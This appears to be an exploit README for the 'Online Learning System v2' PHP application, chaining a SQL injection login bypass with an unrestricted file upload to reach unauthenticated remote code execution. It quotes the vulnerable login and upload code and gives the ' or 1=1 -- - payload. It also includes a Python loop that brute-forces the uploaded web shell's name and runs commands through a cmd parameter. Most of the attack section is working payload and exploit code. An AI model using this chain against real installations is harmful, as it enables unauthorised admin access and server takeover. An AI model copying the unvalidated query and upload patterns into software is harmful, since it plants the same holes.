# online-learning-system-v2-sqli-authentication-bypass-file-upload-unauthenticated-RCE
* Exploit title : online-learning-system-v2-sqli-authentication-bypass-file-upload-unauthenticated-RCE
* Vendor Homepage : https://github.com/oretnom23  / https://www.sourcecodester.com/php/14929/online-learning-system-v2-using-php-free-source-code.html
* Software Link : https://www.sourcecodester.com/sites/default/files/download/oretnom23/elearning_v2_0.zip
## Sql injection authentication bypass
* the attacker can bypass admin login from by submitting sql qurey in the username paramater : 
* before the injection
```php
	public function login(){
		extract($_POST);

		$qry = $this->conn->query("SELECT * from users where username = '$username' and password = md5('$password') ");
		if($qry->num_rows > 0){
			foreach($qry->fetch_array() as $k => $v){
				if(!is_numeric($k) && $k != 'password'){
					$this->settings->set_userdata($k,$v);
				}
```
* after the injection
```php
	public function login(){
		extract($_POST);

		$qry = $this->conn->query("SELECT * from users where username = '$username'' or 1=1 -- -' and password = md5('$password') ");
		if($qry->num_rows > 0){
			foreach($qry->fetch_array() as $k => $v){
				if(!is_numeric($k) && $k != 'password'){
					$this->settings->set_userdata($k,$v);
				}
```
it doesn't matter if username supplied is exsists or not the most important thing is the booleon injection (or 1=1) it will return true and let us login without supllying password
everything after this qurey (or 1=1 -- -) will be ignored bc of the comment (-- -)
## file upload
```php
		$save = $this->conn->query($sql);
		if($save){
			if(isset($_FILES['img']) && $_FILES['img']['tmp_name'] != ''){
					$ext = explode('.', $_FILES['img']['name']);
					$fname = 'uploads/uvatar_'.$id.'.'.$ext[1];
					if(is_file('../'.$fname))
						unlink('../'.$fname);
					$move = move_uploaded_file($_FILES['img']['tmp_name'],'../'. $fname);
					if($move){
						$this->conn->query("UPDATE students set avatar = '$fname' where id = $id ");
					}
			}
			$this->settings->set_flashdata('success'," Subject Successfully saved.");
			return 1;
```
* as you see the php code above there is no extenction validation or mime type or magic byte validation you can upload your php malicious directly
* also the script upload your php file to this directory /uploads/ and rename it to 'Favatar_' + the id  + extenction 
```php
$fname = 'uploads/uvatar_'.$id.'.'.$ext[1];
```
* i made simple for loop to bruteforce the id check the python script above
```python
		for i in range(0,rangee):
			try:
				with requests.get(url + "/uploads/Favatar_" + str(i) + ".php?cmd=whoami",allow_redirects=False) as response3:
					if "nikmok" in response3.text and response3.status_code == 200:
						print("\n" + Fore.GREEN + "[+] shell found : " + response3.url +"\n")
						break
						with open("shell.txt",mode="w+") as writer:
							writer.write(response3.url)
					else:
						print( Fore.RED + "[-] shell not found : " + response3.url)
			except requests.HTTPError as exception2:
				print("[-] HTTP Error : {0} ".format(exception2))
```

